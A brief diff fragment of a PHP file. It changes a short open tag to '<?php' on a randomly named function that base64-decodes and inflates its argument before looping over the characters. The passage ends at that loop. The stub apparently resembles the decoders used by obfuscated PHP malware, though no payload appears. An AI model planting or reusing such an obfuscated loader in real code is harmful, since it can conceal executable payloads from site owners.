@@ -1,4 +1,4 @@
-<? function mXbOMr($BAFQ)
+<?php function mXbOMr($BAFQ)
 { 
 $BAFQ=gzinflate(base64_decode($BAFQ));
  for($i=0;$i<strlen($BAFQ);$i++)
